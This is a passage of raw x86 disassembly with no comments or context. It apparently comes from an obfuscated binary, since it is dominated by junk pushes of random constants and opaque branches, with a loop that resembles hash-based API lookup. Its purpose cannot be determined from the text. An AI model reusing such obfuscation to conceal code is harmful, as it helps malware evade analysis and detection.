  407c5c:	mov    ecx,0x7c
  407c61:	mov    DWORD PTR [ebp-0x30],ecx
  407c64:	and    DWORD PTR [ebp-0x18],edi
  407c67:	mov    DWORD PTR [ebp-0x28],eax
  407c6a:	push   0x35
  407c6c:	call   0x409350
  407c71:	add    esp,0x4
  407c74:	push   0x64
  407c76:	push   0xe6446a00
  407c7b:	push   0x5efb7300
  407c80:	call   0x4095af
  407c85:	add    esp,0xc
  407c88:	mov    ecx,0x408b44
  407c8d:	mov    edi,DWORD PTR [ebp-0x18]
  407c90:	cmp    edi,esi
  407c92:	jne    0x407d1f
  407c98:	add    edi,esi
  407c9a:	mov    ebx,DWORD PTR [ebp-0x18]
  407c9d:	or     edi,eax
  407c9f:	cmp    ebx,DWORD PTR [ebp-0x3c]
  407ca2:	jne    0x407d1f
  407ca4:	mov    eax,DWORD PTR [ebp-0x18]
  407ca7:	mov    esi,ecx
  407ca9:	add    esi,eax
  407cab:	add    ebx,eax
  407cad:	cmp    esi,eax
  407caf:	jne    0x407d1f
  407cb1:	cmp    edi,0xffffffb5
  407cb4:	je     0x407d1f
  407cb6:	mov    eax,ecx
  407cb8:	mov    edx,DWORD PTR [ebp-0x18]
  407cbb:	test   esi,0x5b
  407cc1:	jne    0x407d1f
  407cc3:	mov    DWORD PTR [ebp-0x18],edx
  407cc6:	add    DWORD PTR [ebp-0x18],edi
  407cc9:	sub    ebx,edi
  407ccb:	sub    eax,edx
  407ccd:	sub    ebx,edx
  407ccf:	cmp    esi,0x4e
  407cd2:	je     0x407d1f
  407cd4:	sub    DWORD PTR [ebp-0x18],eax
  407cd7:	mov    eax,DWORD PTR [ebp-0x18]
  407cda:	add    esi,ecx
  407cdc:	mov    edi,DWORD PTR ds:0x43706c
  407ce2:	add    DWORD PTR [ebp-0x18],eax
  407ce5:	test   esi,0xea
  407ceb:	jne    0x407d1f
  407ced:	mov    eax,0xca
  407cf2:	or     DWORD PTR [ebp-0x18],edi
  407cf5:	add    DWORD PTR [ebp-0x18],edi
  407cf8:	xor    edx,edx
  407cfa:	add    DWORD PTR [ebp-0x18],ebx
  407cfd:	sub    DWORD PTR [ebp-0x18],eax
  407d00:	mov    DWORD PTR [ebp-0x18],esi
  407d03:	add    edx,edi
  407d05:	sub    eax,esi
  407d07:	add    DWORD PTR [ebp-0x18],eax
  407d0a:	sub    edx,edi
  407d0c:	or     edx,ebx
  407d0e:	cmp    edx,0xffffffa7
  407d11:	jne    0x407d1f
  407d13:	add    edx,ebx
  407d15:	cmp    ebx,0xffffffb4
  407d18:	jne    0x407d1f
  407d1a:	sub    edx,ebx
  407d1c:	sub    DWORD PTR [ebp-0x18],edx
  407d1f:	push   DWORD PTR [ebp-0x48]
  407d22:	push   0xacf3645d
  407d27:	push   DWORD PTR [ebp-0x28]
  407d2a:	call   ecx
  407d2c:	push   0x96e03600
  407d31:	push   0x7ab95200
  407d36:	call   0x40949f
  407d3b:	add    esp,0x8
  407d3e:	add    DWORD PTR [ebp-0x28],0x30
  407d45:	mov    edi,DWORD PTR [ebp-0x18]
  407d48:	call   0x409350
  407d4d:	xor    DWORD PTR [ebp-0x18],edi
  407d50:	mov    esi,DWORD PTR [ebp-0x28]
  407d53:	mov    DWORD PTR [ebp-0x10],esi
  407d56:	call   esi
  407d58:	mov    ebx,0x75
  407d5d:	mov    ecx,0x17
  407d62:	push   0xbc3ec100
  407d67:	call   0x40a101
  407d6c:	add    esp,0x4
  407d6f:	call   0x409350
  407d74:	push   0xffffff87
  407d76:	call   0x4095af
  407d7b:	add    esp,0x4
  407d7e:	push   0x13
  407d80:	push   0x265ddc00
  407d85:	push   0xffffffed
  407d87:	push   0xffffffc3
  407d89:	push   0xffffffea
  407d8b:	call   0x409e1d
  407d90:	add    esp,0x14
  407d93:	push   0xaeeaef00
  407d98:	push   0x2b
  407d9a:	push   0x6284b900
  407d9f:	call   0x40949f
  407da4:	add    esp,0xc
  407da7:	push   0xffffffb3
  407da9:	push   0xf2f64d00
  407dae:	push   0xbc2d9500
  407db3:	call   0x409167
  407db8:	add    esp,0xc
  407dbb:	sub    DWORD PTR [ebp-0x18],edi
  407dbe:	push   0x3e072000
  407dc3:	call   0x4095af
  407dc8:	add    esp,0x4
  407dcb:	add    ebx,esi
  407dcd:	add    ebx,edi
  407dcf:	push   0x56a79500
  407dd4:	call   0x40a101
  407dd9:	add    esp,0x4
  407ddc:	push   0x9c39af00
  407de1:	call   0x40a101
  407de6:	add    esp,0x4
  407de9:	push   0x9e7d6a00
  407dee:	push   0x26771800
  407df3:	push   0xa689dd00
  407df8:	push   0x3e56b800
  407dfd:	push   0x3e540c00
  407e02:	call   0x4095af
  407e07:	add    esp,0x14
  407e0a:	push   0x3c091200
  407e0f:	call   0x40a101
  407e14:	add    esp,0x4
  407e17:	push   0xffffffb7
  407e19:	call   0x409afe
  407e1e:	add    esp,0x4
  407e21:	push   0xe2ba5c00
  407e26:	push   0x3e722b00
  407e2b:	push   0xc2906600
  407e30:	push   0xffffffac
  407e32:	call   0x4095af
  407e37:	add    esp,0x10
  407e3a:	push   0xffffffb1
  407e3c:	push   0x6aa2300
  407e41:	push   0xffffffd1
  407e43:	push   0xe659f100
  407e48:	push   0xd290ff00
  407e4d:	call   0x40949f
  407e52:	add    esp,0x14
  407e55:	cmp    ebx,0xffffff85
  407e58:	je     0x407f2c
  407e5e:	sub    ebx,edi
  407e60:	push   0xffffffd6
  407e62:	call   0x409e1d
  407e67:	add    esp,0x4
  407e6a:	sub    ebx,edi
  407e6c:	call   0x409c22
  407e71:	add    ebx,esi
  407e73:	mov    esi,DWORD PTR [ebp-0x18]
  407e76:	cmp    esi,DWORD PTR ds:0x43706c
  407e7c:	je     0x407f2c
  407e82:	mov    ecx,DWORD PTR ds:0x43705c
  407e88:	cmp    eax,DWORD PTR ds:0x43705c
  407e8e:	je     0x407f2c
  407e94:	mov    eax,DWORD PTR ds:0x43706c
  407e9a:	and    DWORD PTR [ebp-0x10],eax
  407e9d:	sub    esi,ecx
  407e9f:	add    DWORD PTR [ebp-0x18],esi
  407ea2:	add    DWORD PTR [ebp-0x10],esi
  407ea5:	mov    esi,DWORD PTR ds:0x43705c
  407eab:	push   0x7a
  407ead:	push   0x6d
  407eaf:	push   0x21
  407eb1:	call   0x40949f
  407eb6:	add    esp,0xc
  407eb9:	push   0x9ead3100
  407ebe:	push   0xffffffd7
  407ec0:	push   0xfffffffe
  407ec2:	call   0x409e1d
  407ec7:	add    esp,0xc
  407eca:	add    DWORD PTR [ebp-0x10],ebx
  407ecd:	push   0x6c1ce200
  407ed2:	push   0x663a2e00
  407ed7:	push   0x26fd0800
  407edc:	push   0x8ee18700
  407ee1:	call   0x409e1d
  407ee6:	add    esp,0x10
  407ee9:	push   0x10
  407eeb:	push   0x3edd9b00
  407ef0:	push   0xffffff80
  407ef2:	push   0xbee8c200
  407ef7:	push   0xffffff90
  407ef9:	call   0x40949f
  407efe:	add    esp,0x14
  407f01:	push   0x4e85d400
  407f06:	push   0x6c414f00
  407f0b:	push   0xffffffc2
  407f0d:	push   0xffffffe2
  407f0f:	push   0xffffffb4
  407f11:	call   0x409e1d
  407f16:	add    esp,0x14
  407f19:	push   0x2d
  407f1b:	push   0x43
  407f1d:	push   0xffffffef
  407f1f:	call   0x409afe
  407f24:	add    esp,0xc
  407f27:	add    esi,esi
  407f29:	add    DWORD PTR [ebp-0x18],esi
  407f2c:	push   0x49
  407f2e:	call   0x409afe
  407f33:	add    esp,0x4
  407f36:	and    DWORD PTR [ebp-0x18],edi
  407f39:	push   0x2f
  407f3b:	call   0x409350
  407f40:	add    esp,0x4
  407f43:	push   0x61
  407f45:	call   0x409e1d
  407f4a:	add    esp,0x4
  407f4d:	call   0x409167
  407f52:	cmp    ebx,0x7ee3
  407f58:	je     0x4080a0
  407f5e:	sub    edi,ebx
  407f60:	push   0x3e438b00
  407f65:	push   0xffffffd9
  407f67:	call   0x40949f
  407f6c:	add    esp,0x8
  407f6f:	push   0xffffff9b
  407f71:	push   0x264c4300
  407f76:	call   0x409afe
  407f7b:	add    esp,0x8
  407f7e:	cmp    edi,DWORD PTR [ebp-0x2c]
  407f81:	je     0x4080a0
  407f87:	push   0x9e14c500
  407f8c:	push   0x96fa5f00
  407f91:	push   0xffffffcb
  407f93:	push   0x9e443300
  407f98:	call   0x409350
  407f9d:	add    esp,0x10
  407fa0:	push   0x2c107000
  407fa5:	call   0x40a101
  407faa:	add    esp,0x4
  407fad:	mov    edx,DWORD PTR [ebp-0x18]
  407fb0:	push   0xfffffff1
  407fb2:	push   0xa9dd000
  407fb7:	push   0xbacd6600
  407fbc:	push   0x9e244600
  407fc1:	call   0x40a101
  407fc6:	add    esp,0x10
  407fc9:	push   0xc19a400
  407fce:	call   0x409350
  407fd3:	add    esp,0x4
  407fd6:	push   0xcc4aae00
  407fdb:	push   0xf6dca400
  407fe0:	push   0xffffffff
  407fe2:	push   0x22
  407fe4:	push   0xffffff9b
  407fe6:	call   0x409350
  407feb:	add    esp,0x14
  407fee:	call   0x409167
  407ff3:	and    edi,eax
  407ff5:	push   0x3
  407ff7:	call   0x409c22
  407ffc:	add    esp,0x4
  407fff:	push   0x5
  408001:	push   0x48
  408003:	push   0x969e7600
  408008:	call   0x40a101
  40800d:	add    esp,0xc
  408010:	test   edi,0xa3
  408016:	je     0x4080a0
  40801c:	push   0x7c64ed00
  408021:	call   0x409350
  408026:	add    esp,0x4
  408029:	push   0x1e567700
  40802e:	push   0x32aaa100
  408033:	push   0x24
  408035:	call   0x409350
  40803a:	add    esp,0xc
  40803d:	mov    esi,DWORD PTR [ebp-0x18]
  408040:	mov    edx,DWORD PTR [ebp-0x18]
  408043:	push   0xffffffbe
  408045:	push   0xcaec4000
  40804a:	push   0x96bef800
  40804f:	call   0x409c22
  408054:	add    esp,0xc
  408057:	and    esi,edi
  408059:	push   0x3ee94800
  40805e:	push   0xffffff99
  408060:	push   0x60
  408062:	push   0x73
  408064:	push   0x23
  408066:	call   0x409167
  40806b:	add    esp,0x14
  40806e:	push   0xee868b00
  408073:	push   0xffffffa8
  408075:	push   0x20
  408077:	push   0x5c
  408079:	push   0xa6986400
  40807e:	call   0x409afe
  408083:	add    esp,0x14
  408086:	cmp    esi,0x26
  408089:	je     0x4080a0
  40808b:	mov    eax,0x1db0
  408090:	push   0xef91000
  408095:	call   0x409e1d
  40809a:	add    esp,0x4
  40809d:	xor    DWORD PTR [ebp-0x18],esi
  4080a0:	push   0x1
  4080a2:	push   0x33
  4080a4:	push   0x1e59b200
  4080a9:	push   0x7ed3ac00
  4080ae:	push   0x69
  4080b0:	call   0x409afe
  4080b5:	add    esp,0x14
  4080b8:	mov    ebx,0xefc5
  4080bd:	call   0x40949f
  4080c2:	sub    ebx,esi
  4080c4:	push   0x49
  4080c6:	call   0x409e1d
  4080cb:	add    esp,0x4
  4080ce:	cmp    ebx,DWORD PTR [ebp-0x38]
  4080d1:	jne    0x4080ee
  4080d3:	push   0x6c261300
  4080d8:	push   0xffffffdb
  4080da:	push   0x8eae6400
  4080df:	push   0x38
  4080e1:	push   0x47
  4080e3:	call   0x4095af
  4080e8:	add    esp,0x14
  4080eb:	sub    DWORD PTR [ebp-0x10],ebx
  4080ee:	push   0x5afc4300
  4080f3:	call   0x409167
  4080f8:	add    esp,0x4
  4080fb:	pop    edi
  4080fc:	or     esi,eax
  4080fe:	and    esi,ebx
  408100:	sub    esi,edi
  408102:	mov    edx,0x91
  408107:	add    DWORD PTR [ebp-0x18],edx
  40810a:	sub    esi,ebx
  40810c:	add    DWORD PTR [ebp-0x10],esi
  40810f:	push   0xda9a8700
  408114:	push   0xc2b83b00
  408119:	push   0x9e2a3000
  40811e:	call   0x409e1d
  408123:	add    esp,0xc
  408126:	pop    esi
  408127:	push   0xffffffa8
  408129:	call   0x409350
  40812e:	add    esp,0x4
  408131:	pop    ebx
  408132:	mov    eax,DWORD PTR [ebp-0x10]
  408135:	push   0xffffff8d
  408137:	push   0xffffffa0
  408139:	push   0x6aec4200
  40813e:	push   0xffffffc3
  408140:	push   0xcc72de00
  408145:	call   0x409167
  40814a:	add    esp,0x14
  40814d:	leave  
  40814e:	ret    
  40814f:	int3   
  408150:	int3   
  408151:	int3   
  408152:	int3   
  408153:	int3   
  408154:	push   ebp
  408155:	mov    ebp,esp
  408157:	sub    esp,0x38
  40815a:	mov    edx,0xaa
  40815f:	push   0xffffff9a
  408161:	push   0xa66ea100
  408166:	push   0x25
  408168:	push   0xffffff87
  40816a:	push   0x3e918c00
  40816f:	call   0x409e1d
  408174:	add    esp,0x14
  408177:	push   ebx
  408178:	push   0xeca93900
  40817d:	push   0xffffffea
  40817f:	call   0x4095af
  408184:	add    esp,0x8
  408187:	push   esi
  408188:	push   0xfffffffb
  40818a:	push   0xa6a3e800
  40818f:	call   0x409c22
  408194:	add    esp,0x8
  408197:	push   0x2c971600
  40819c:	push   0x96116f00
  4081a1:	push   0x72602b00
  4081a6:	call   0x4095af
  4081ab:	add    esp,0xc
  4081ae:	push   edi
  4081af:	push   0x6e0ec200
  4081b4:	call   0x409167
  4081b9:	add    esp,0x4
  4081bc:	call   0x409167
  4081c1:	cmp    eax,DWORD PTR [ebp-0x24]
  4081c4:	je     0x4081dc
  4081c6:	push   0x3ef2a300
  4081cb:	push   0xffffff9b
  4081cd:	push   0xffffffd3
  4081cf:	push   0xbcac8600
  4081d4:	call   0x409350
  4081d9:	add    esp,0x10
  4081dc:	call   0x409afe
  4081e1:	mov    DWORD PTR [ebp-0x4],0xfb616b49
  4081e8:	push   0xffffffeb
  4081ea:	push   0xffffff97
  4081ec:	push   0x4cb5a400
  4081f1:	push   0xa2069e00
  4081f6:	push   0xffffffb4
  4081f8:	call   0x40a101
  4081fd:	add    esp,0x14
  408200:	push   0xb20f4200
  408205:	call   0x409afe
  40820a:	add    esp,0x4
  40820d:	call   0x4089ca
  408212:	mov    ebx,0x63
  408217:	mov    edi,0xfa
  40821c:	mov    DWORD PTR [ebp-0x10],edi
  40821f:	add    DWORD PTR [ebp-0x10],ebx
  408222:	mov    DWORD PTR [ebp-0x28],eax
  408225:	mov    eax,0x4e
  40822a:	call   0x409afe
  40822f:	push   0xfffffffb
  408231:	push   0x72762400
  408236:	push   0x9edca000
  40823b:	call   0x409c22
  408240:	add    esp,0xc
  408243:	call   0x4089ca
  408248:	add    edi,edi
  40824a:	mov    ecx,0x15
  40824f:	mov    edx,0xd7c1
  408254:	and    DWORD PTR [ebp-0x10],edx
  408257:	or     edi,edx
  408259:	add    DWORD PTR [ebp-0x10],edi
  40825c:	add    DWORD PTR [ebp-0x10],ecx
  40825f:	mov    DWORD PTR [ebp-0x8],eax
  408262:	push   0x5c967500
  408267:	push   0x3c
  408269:	push   0xcea3200
  40826e:	push   0x3e993700
  408273:	call   0x40a101
  408278:	add    esp,0x10
  40827b:	push   0x17
  40827d:	push   0x8667d900
  408282:	push   0x9e452f00
  408287:	push   0x3edc1d00
  40828c:	push   0xfffffffb
  40828e:	call   0x409c22
  408293:	add    esp,0x14
  408296:	call   0x4089ca
  40829b:	sub    edi,ebx
  40829d:	mov    edx,DWORD PTR [ebp-0x10]
  4082a0:	test   edx,0x6d
  4082a6:	je     0x408314
  4082a8:	add    edx,ebx
  4082aa:	xor    ebx,ebx
  4082ac:	add    edi,edi
  4082ae:	cmp    edx,0xffffffab
  4082b1:	jne    0x408314
  4082b3:	mov    ecx,0xca
  4082b8:	mov    esi,DWORD PTR ds:0x437048
  4082be:	sub    DWORD PTR [ebp-0x10],esi
  4082c1:	and    DWORD PTR [ebp-0x10],edi
  4082c4:	add    DWORD PTR [ebp-0x10],edx
  4082c7:	and    ebx,eax
  4082c9:	cmp    ebx,DWORD PTR ds:0x437048
  4082cf:	je     0x408314
  4082d1:	mov    edx,DWORD PTR [ebp-0x10]
  4082d4:	and    ecx,esi
  4082d6:	mov    edi,DWORD PTR [ebp-0x10]
  4082d9:	add    DWORD PTR [ebp-0x10],edi
  4082dc:	cmp    edx,ebx
  4082de:	jne    0x4082f3
  4082e0:	mov    esi,DWORD PTR [ebp-0x10]
  4082e3:	add    edx,esi
  4082e5:	mov    esi,0x58
  4082ea:	and    DWORD PTR [ebp-0x10],ebx
  4082ed:	sub    DWORD PTR [ebp-0x10],edx
  4082f0:	add    DWORD PTR [ebp-0x10],esi
  4082f3:	cmp    ebx,DWORD PTR [ebp-0x2c]
  4082f6:	jne    0x408314
  4082f8:	cmp    eax,0xfd1f
  4082fd:	je     0x408314
  4082ff:	or     edi,ebx
  408301:	mov    ebx,edx
  408303:	and    ebx,eax
  408305:	mov    ecx,0xa3
  40830a:	and    edi,ecx
  40830c:	add    edi,ebx
  40830e:	add    DWORD PTR [ebp-0x10],ebx
  408311:	sub    DWORD PTR [ebp-0x10],edi
  408314:	mov    DWORD PTR [ebp-0x18],eax
  408317:	push   0xffffff9f
  408319:	call   0x4095af
  40831e:	add    esp,0x4
  408321:	mov    ebx,DWORD PTR [ebp-0x8]
  408324:	push   0x82586400
  408329:	push   0x9eb9aa00
  40832e:	push   0x9ec4c300
  408333:	push   0x6661d900
  408338:	push   0x261ef00
  40833d:	call   0x409afe
  408342:	add    esp,0x14
  408345:	push   0x1
  408347:	push   0xffffffd1
  408349:	push   0x560e8d00
  40834e:	call   0x40a101
  408353:	add    esp,0xc
  408356:	sub    ebx,DWORD PTR [ebp-0x28]
  408359:	push   0xfffffff5
  40835b:	push   0x3eab0e00
  408360:	push   0xffffff8d
  408362:	push   0xfffffffa
  408364:	push   0xc6592800
  408369:	call   0x409167
  40836e:	add    esp,0x14
  408371:	xor    ebx,0x3fc6683b
  408377:	mov    edi,0xcbb
  40837c:	mov    edx,ebx
  40837e:	push   0x3e95e600
  408383:	push   0xcc8b7b00
  408388:	call   0x409167
  40838d:	add    esp,0x8
  408390:	call   0x409350
  408395:	add    edi,edi
  408397:	sub    edi,eax
  408399:	sub    edi,eax
  40839b:	call   0x409afe
  4083a0:	push   0x72659e00
  4083a5:	call   0x40949f
  4083aa:	add    esp,0x4
  4083ad:	push   0x23
  4083af:	push   0x5a092400
  4083b4:	push   0x1b
  4083b6:	push   0xae4b1d00
  4083bb:	call   0x409afe
  4083c0:	add    esp,0x10
  4083c3:	call   0x409c22
  4083c8:	push   0xffffffae
  4083ca:	push   0x465d0c00
  4083cf:	push   0xffffff82
  4083d1:	call   0x409e1d
  4083d6:	add    esp,0xc
  4083d9:	call   0x40a101
  4083de:	push   0x68
  4083e0:	push   0x6e
  4083e2:	push   0xa6fa6700
  4083e7:	call   0x409e1d
  4083ec:	add    esp,0xc
  4083ef:	push   0x6e241500
  4083f4:	push   0x42390400
  4083f9:	push   0xe6ad1c00
  4083fe:	push   0xffffff86
  408400:	call   0x409e1d
  408405:	add    esp,0x10
  408408:	call   0x409167
  40840d:	push   0xffffff9f
  40840f:	call   0x409c22
  408414:	add    esp,0x4
  408417:	add    edi,ebx
  408419:	push   0x3e926600
  40841e:	push   0x3ee89700
  408423:	push   0xffffff82
  408425:	push   0x86434500
  40842a:	push   0x8cf5fd00
  40842f:	call   0x40a101
  408434:	add    esp,0x14
  408437:	push   0x46559d00
  40843c:	push   0x3a
  40843e:	call   0x40a101
  408443:	add    esp,0x8
  408446:	cmp    edi,ebx
  408448:	jne    0x40855a
  40844e:	mov    eax,0xe5
  408453:	or     DWORD PTR [ebp-0x10],eax
  408456:	add    edi,edi
  408458:	mov    ecx,DWORD PTR [ebp-0x10]
  40845b:	push   0xae5def00
  408460:	push   0x3e88e300
  408465:	push   0x27
  408467:	push   0x22
  408469:	call   0x409e1d
  40846e:	add    esp,0x10
  408471:	push   0xf
  408473:	push   0x26e14700
  408478:	call   0x4095af
  40847d:	add    esp,0x8
  408480:	push   0xf25d5800
  408485:	push   0x7a500b00
  40848a:	push   0xffffffc3
  40848c:	call   0x409350
  408491:	add    esp,0xc
  408494:	push   0x823a4000
  408499:	push   0xffffffd6
  40849b:	call   0x40a101
  4084a0:	add    esp,0x8
  4084a3:	call   0x409167
  4084a8:	push   0xfc9a5100
  4084ad:	push   0x1ef0e100
  4084b2:	push   0x78
  4084b4:	push   0xb659cc00
  4084b9:	call   0x409350
  4084be:	add    esp,0x10
  4084c1:	or     edi,esi
  4084c3:	call   0x409350
  4084c8:	push   0x6e758600
  4084cd:	push   0x8e637200
  4084d2:	push   0x9ede6800
  4084d7:	push   0xfcd94d00
  4084dc:	push   0xffffff9c
  4084de:	call   0x40a101
  4084e3:	add    esp,0x14
  4084e6:	or     edi,eax
  4084e8:	cmp    edi,DWORD PTR ds:0x437048
  4084ee:	jne    0x40855a
  4084f0:	and    edi,esi
  4084f2:	push   0xffffff8f
  4084f4:	push   0xde7fcc00
  4084f9:	push   0xa6dfb100
  4084fe:	push   0x1c
  408500:	push   0x55
  408502:	call   0x40a101
  408507:	add    esp,0x14
  40850a:	push   0xffffff9d
  40850c:	push   0xffffffd4
  40850e:	call   0x4095af
  408513:	add    esp,0x8
  408516:	push   0x26941700
  40851b:	push   0x13
  40851d:	call   0x409c22
  408522:	add    esp,0x8
  408525:	push   0xffffffd2
  408527:	push   0xfffffffb
  408529:	call   0x409e1d
  40852e:	add    esp,0x8
  408531:	test   edi,0x4
  408537:	jne    0x40855a
  408539:	push   0xffffffd0
  40853b:	push   0x1e680400
  408540:	call   0x4095af
  408545:	add    esp,0x8
  408548:	push   0x9e935f00
  40854d:	push   0xffffffc1
  40854f:	call   0x40a101
  408554:	add    esp,0x8
  408557:	add    DWORD PTR [ebp-0x10],edi
  40855a:	mov    eax,DWORD PTR [ebp-0x18]
  40855d:	mov    ecx,DWORD PTR [ebp-0x10]
  408560:	cmp    ecx,DWORD PTR ds:0x437048
  408566:	jne    0x4085a0
  408568:	add    ecx,eax
  40856a:	mov    edx,0xc
  40856f:	mov    edi,0xe7
  408574:	sub    DWORD PTR [ebp-0x10],edx
  408577:	cmp    ecx,edi
  408579:	jne    0x4085a0
  40857b:	and    ecx,edi
  40857d:	mov    edx,DWORD PTR ds:0x437048
  408583:	xor    DWORD PTR [ebp-0x10],edx
  408586:	add    ecx,eax
  408588:	and    ecx,ebx
  40858a:	cmp    ecx,DWORD PTR [ebp-0xc]
  40858d:	je     0x4085a0
  40858f:	mov    edx,DWORD PTR [ebp-0x10]
  408592:	and    ecx,ebx
  408594:	mov    DWORD PTR [ebp-0x10],ecx
  408597:	mov    ecx,DWORD PTR [ebp-0x10]
  40859a:	sub    DWORD PTR [ebp-0x10],edx
  40859d:	xor    DWORD PTR [ebp-0x10],ecx
  4085a0:	sub    eax,DWORD PTR [ebp-0x8]
  4085a3:	add    DWORD PTR [ebp-0x10],edi
  4085a6:	xor    eax,0x3fc6683e
  4085ab:	cmp    eax,DWORD PTR [ebp-0x34]
  4085ae:	jne    0x4085bb
  4085b0:	cmp    eax,DWORD PTR ds:0x437048
  4085b6:	je     0x4085bb
  4085b8:	sub    DWORD PTR [ebp-0x10],eax
  4085bb:	cmp    ebx,eax
  4085bd:	je     0x40880e
  4085c3:	push   0x7e2ed600
  4085c8:	push   0xffffff8c
  4085ca:	push   0xffffff90
  4085cc:	push   0xd21cef00
  4085d1:	push   0x5cec1900
  4085d6:	call   0x409e1d
  4085db:	add    esp,0x14
  4085de:	push   0xccc88600
  4085e3:	call   0x409167
  4085e8:	add    esp,0x4
  4085eb:	push   0x437048
  4085f0:	call   DWORD PTR ds:0x417270
  4085f6:	xor    esi,esi
  4085f8:	mov    ebx,DWORD PTR ds:0x437048
  4085fe:	sub    DWORD PTR [ebp-0x10],ebx
  408601:	mov    DWORD PTR [ebp-0x10],esi
  408604:	or     eax,eax
  408606:	je     0x40880e
  40860c:	mov    edi,DWORD PTR [ebp-0x10]
  40860f:	mov    ebx,DWORD PTR [ebp-0x10]
  408612:	cmp    edi,0x72
  408615:	jne    0x4086a1
  40861b:	cmp    edi,DWORD PTR ds:0x437048
  408621:	jne    0x4086a1
  408623:	add    ebx,edi
  408625:	mov    edi,DWORD PTR [ebp-0x10]
  408628:	sub    ebx,edi
  40862a:	mov    ecx,DWORD PTR ds:0x437048
  408630:	add    DWORD PTR [ebp-0x10],ecx
  408633:	cmp    ebx,0x42
  408636:	jne    0x4086a1
  408638:	cmp    ebx,DWORD PTR [ebp-0x10]
  40863b:	je     0x4086a1
  40863d:	cmp    ebx,DWORD PTR ds:0x437048
  408643:	jne    0x4086a1
  408645:	mov    edi,DWORD PTR [ebp-0x10]
  408648:	cmp    edi,0x25
  40864b:	jne    0x4086a1
  40864d:	mov    esi,ecx
  40864f:	mov    edx,DWORD PTR [ebp-0x10]
  408652:	sub    DWORD PTR [ebp-0x10],ebx
  408655:	cmp    edx,0x2
  408658:	je     0x4086a1
  40865a:	sub    edx,esi
  40865c:	mov    esi,DWORD PTR [ebp-0x10]
  40865f:	mov    ebx,DWORD PTR [ebp-0x10]
  408662:	or     DWORD PTR [ebp-0x10],esi
  408665:	and    edx,eax
  408667:	add    ebx,ecx
  408669:	add    edi,eax
  40866b:	add    DWORD PTR [ebp-0x10],edx
  40866e:	cmp    ebx,0xfffffffe
  408671:	jne    0x4086a1
  408673:	mov    edx,0x6c
  408678:	add    DWORD PTR [ebp-0x10],ebx
  40867b:	xor    ecx,ecx
  40867d:	add    edi,esi
  40867f:	test   edi,0xa6f4
  408685:	jne    0x4086a1
  408687:	mov    ebx,0x45f9
  40868c:	mov    esi,DWORD PTR [ebp-0x10]
  40868f:	add    DWORD PTR [ebp-0x10],edx
  408692:	mov    DWORD PTR [ebp-0x10],ecx
  408695:	sub    DWORD PTR [ebp-0x10],edi
  408698:	sub    DWORD PTR [ebp-0x10],esi
  40869b:	sub    DWORD PTR [ebp-0x10],edx
  40869e:	add    DWORD PTR [ebp-0x10],ebx
  4086a1:	add    DWORD PTR [ebp-0x4],0x3d90b4a3
  4086a8:	mov    edx,DWORD PTR ds:0x437044
  4086ae:	mov    ebx,ecx
  4086b0:	add    DWORD PTR [ebp-0x10],edx
  4086b3:	sub    DWORD PTR [ebp-0x10],edx
  4086b6:	xor    DWORD PTR [ebp-0x10],edx
  4086b9:	add    ebx,edx
  4086bb:	and    DWORD PTR [ebp-0x10],esi
  4086be:	sub    DWORD PTR [ebp-0x10],ebx
  4086c1:	lea    ebx,[eax+0x20c]
  4086c7:	mov    edx,DWORD PTR [ebp-0x10]
  4086ca:	sub    DWORD PTR [ebp-0x10],ebx
  4086cd:	mov    eax,DWORD PTR [ebp-0x10]
  4086d0:	push   0xffffff91
  4086d2:	call   0x4095af
  4086d7:	add    esp,0x4
  4086da:	inc    ebx
  4086db:	add    DWORD PTR [ebp-0x10],edi
  4086de:	mov    edi,DWORD PTR [ebx]
  4086e0:	push   0xe6826300
  4086e5:	push   0xffffff8a
  4086e7:	push   0xd66b5400
  4086ec:	push   0xda24f600
  4086f1:	push   0x52196700
  4086f6:	call   0x40949f
  4086fb:	add    esp,0x14
  4086fe:	sub    edi,0x2b3d34f3
  408704:	mov    ecx,DWORD PTR [ebp-0x10]
  408707:	test   ecx,0x4b
  40870d:	jne    0x408714
  40870f:	call   0x409167
  408714:	push   0xfa095c00
  408719:	push   0xffffff92
  40871b:	push   0xffffffb0
  40871d:	push   0x18
  40871f:	call   0x4095af
  408724:	add    esp,0x10
  408727:	cmp    edi,0xbd805628
  40872d:	jne    0x4086c7
  40872f:	add    DWORD PTR [ebp-0x10],esi
  408732:	push   0x39
  408734:	push   0x4a
  408736:	push   0xffffffb3
  408738:	push   0x1eabf300
  40873d:	push   0x5e2d2b00
  408742:	call   0x409afe
  408747:	add    esp,0x14
  40874a:	mov    edi,DWORD PTR [ebx+0x4]
  40874d:	mov    ebx,DWORD PTR [ebp-0x10]
  408750:	push   0x6a49e100
  408755:	call   0x40949f
  40875a:	add    esp,0x4
  40875d:	mov    ecx,DWORD PTR [ebp-0x10]
  408760:	cmp    ecx,0x40a3
  408766:	je     0x40880b
  40876c:	cmp    ebx,DWORD PTR [ebp-0x38]
  40876f:	jne    0x40880b
  408775:	mov    edx,DWORD PTR [ebp-0x10]
  408778:	mov    eax,ecx
  40877a:	sub    DWORD PTR [ebp-0x10],edi
  40877d:	call   0x40a101
  408782:	add    ebx,esi
  408784:	push   0x66c0fe00
  408789:	call   0x409e1d
  40878e:	add    esp,0x4
  408791:	or     DWORD PTR [ebp-0x10],eax
  408794:	and    ebx,esi
  408796:	push   0xffffff98
  408798:	push   0x22784700
  40879d:	call   0x409afe
  4087a2:	add    esp,0x8
  4087a5:	push   0x5e7c8f00
  4087aa:	push   0xffffffea
  4087ac:	push   0xccf3b300
  4087b1:	call   0x409c22
  4087b6:	add    esp,0xc
  4087b9:	push   0x8cd45d00
  4087be:	push   0x41
  4087c0:	push   0xda570600
  4087c5:	push   0x6c8ef200
  4087ca:	push   0xda7a0f00
  4087cf:	call   0x409c22
  4087d4:	add    esp,0x14
  4087d7:	push   0xffffffd2
  4087d9:	push   0x67
  4087db:	push   0xffffffab
  4087dd:	call   0x409350
  4087e2:	add    esp,0xc
  4087e5:	push   0xffffffa1
  4087e7:	push   0x8cba6100
  4087ec:	push   0xc652d800
  4087f1:	push   0x4cd72400
  4087f6:	call   0x409e1d
  4087fb:	add    esp,0x10
  4087fe:	call   0x40a101
  408803:	cmp    ebx,0xffffffbe
  408806:	je     0x40880b
  408808:	add    DWORD PTR [ebp-0x10],ebx
  40880b:	sub    DWORD PTR [ebp-0x4],edi
  40880e:	push   0xffffffc3
  408810:	call   0x4095af
  408815:	add    esp,0x4
  408818:	push   0x3ef6c400
  40881d:	push   0x8e1e3b00
  408822:	push   0x39
  408824:	push   0xfffffff3
  408826:	push   0x3eab0100
  40882b:	call   0x409c22
  408830:	add    esp,0x14
  408833:	mov    ebx,DWORD PTR ds:0x437048
